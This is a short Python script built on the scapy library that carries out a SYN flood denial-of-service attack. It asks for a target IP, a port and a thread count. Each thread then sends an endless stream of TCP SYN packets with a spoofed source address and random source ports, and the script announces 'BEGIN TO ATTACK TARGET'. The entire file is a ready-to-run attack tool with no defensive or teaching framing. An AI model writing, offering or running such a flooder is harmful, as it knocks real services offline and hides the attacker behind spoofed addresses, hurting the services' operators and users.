from scapy.all import *
import threading
import random

def Syn_flood(target_ip, target_port):
 	while True:
 		port = random.randint(0,10000)
 		send(IP(src="1.1.1.1", dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)
 		#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)

def main(target_ip, target_port, threads):
	print "BEGIN TO ATTACK TARGET"
	for i in range(0, threads):
		#print "test" 
		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))
		t.start()

if __name__== "__main__": 
	target_ip = raw_input("Please input the target_ip: ")
	target_port = int(raw_input("Please input the target_port: "))
	threads = int(raw_input("Please input the threads: "))
	main(target_ip, target_port, threads)